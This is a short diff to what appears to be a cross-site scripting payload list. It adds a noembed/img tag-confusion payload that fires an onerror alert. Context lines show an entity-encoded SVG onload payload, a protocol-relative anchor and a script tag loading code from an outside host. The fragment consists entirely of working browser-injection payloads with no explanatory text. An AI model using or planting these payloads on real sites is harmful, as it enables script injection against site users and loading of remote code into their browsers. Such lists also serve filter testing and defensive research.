@@ -70,6 +70,8 @@
 
 ```<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>```
 
+```<noembed><img title="</noembed><img src onerror=alert(21)>"></noembed>```
+
 ```<a/href=//0>```
 
 ```<script src=//14.rs>```
